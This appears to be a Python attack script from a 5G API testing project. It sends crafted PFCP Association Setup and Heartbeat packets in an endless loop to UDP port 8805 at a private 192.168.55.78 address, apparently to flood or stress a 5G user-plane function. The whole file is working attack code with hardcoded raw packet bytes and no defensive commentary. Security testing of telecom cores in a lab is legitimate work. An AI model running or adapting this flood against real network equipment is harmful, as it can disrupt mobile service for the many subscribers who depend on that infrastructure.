#!/usr/bin/env python
# -*- coding:utf-8 -*-
"""
@author: GW
@time: 2025-05-15 15:31 
@file: attack_kkgupf.py
@project: 5gAPItest
@describe: Powered By GW
"""
#!/usr/bin/env python3

import socket
while True:
   udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   # udp_socket.settimeout(1.0)
   pfcp_association_setup_request = b'\x20\x05\x00\x1f\x00\x00\x01\x00\x00\x3c\x00\x05\x00\x0a\x64\xc8\x64\x00\x60\x00\x04\xe8\x1f\xdc\x30\x00\x2b\x00\x06\x21\x00\x00\x00\x00\x00'
   pfcp_heartbeat_request = b'\x20\x01\x00\x0f\x00\x00\x00\xff\xff\xff\x00\x00\x60\x00\x04\xe8\x1f\xdc\x30'
   udp_socket.sendto(pfcp_association_setup_request, ('192.168.55.78', 8805))
   udp_socket.recv(65535)
   udp_socket.sendto(pfcp_heartbeat_request, ('192.168.55.78', 8805))
   udp_socket.recv(65535)
   udp_socket.close()